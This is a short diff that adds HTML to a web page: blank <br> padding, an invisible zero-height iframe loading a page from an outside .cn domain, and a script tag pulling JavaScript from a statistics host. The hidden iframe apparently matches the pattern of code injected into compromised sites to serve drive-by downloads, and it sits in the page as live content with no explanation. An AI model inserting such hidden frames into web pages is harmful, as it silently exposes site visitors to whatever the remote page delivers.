@@ -1,0 +1,14 @@
+ 
+<br>
+<iframe src=http://www.baomaaa.cn/a2/fxx.htm width=100 height=0></Iframe>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+
+
+<script type="text/javascript" src="http://js.tongji.cn.yahoo.com/857114/ystet.js"></script>
+<br>
